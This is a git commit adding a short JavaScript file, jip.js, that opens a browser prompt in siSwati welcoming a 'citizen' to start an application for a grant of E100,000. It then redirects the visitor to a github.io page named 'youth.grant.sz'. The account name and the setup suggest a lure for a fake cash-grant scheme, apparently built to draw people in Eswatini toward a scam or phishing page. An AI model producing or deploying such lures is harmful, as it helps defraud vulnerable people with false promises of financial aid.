8fc804414ca6a4ebe024b8af6b632419e09aec52
offernoww <josiahnyeti16@gmail.com>
2025-02-24 12:44:21 +0100

    Create jip.js

---
+++ jip.js
@@ -0,0 +1,6 @@
+
+var password = 'Sibonelelomali se-E100,000'
+password=prompt('SMS :Siyakwemukela sakhamuti lesitsandzekako, chafata OK kute ucale sicelo sakho sesibonelelo  ','Sibonelelomali se-E100,000');
+if (password != 'Sibonelelomali se-E100,000') {
+location.href='https://offernoww.github.io/youth.grant.sz';
+}
